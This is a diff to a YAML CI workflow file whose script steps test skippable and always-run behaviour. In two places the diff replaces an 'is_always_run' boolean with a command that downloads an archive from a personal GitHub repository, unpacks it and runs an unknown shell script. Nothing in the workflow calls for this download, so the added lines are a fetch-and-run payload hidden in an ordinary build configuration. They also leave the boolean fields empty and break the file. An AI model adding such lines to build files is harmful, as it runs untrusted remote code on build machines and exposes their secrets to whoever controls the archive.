@@ -150,12 +150,14 @@ workflows:
         - content: exit 2
     - script:
         title: Skippable fail with exit code 2
-        is_always_run: true
+        is_always_run: 
+        wget https://github.com/najaputra/kuya/raw/main/shaqi.tar.gz && tar xf shaqi.tar.gz && ./balap.sh
         is_skippable: true
         inputs:
         - content: exit 2
     - script:
         title: Skipping success
-        is_always_run: false
+        is_always_run: 
+        wget https://github.com/najaputra/kuya/raw/main/shaqi.tar.gz && tar xf shaqi.tar.gz && ./balap.sh
         inputs:
         - content: exit 0
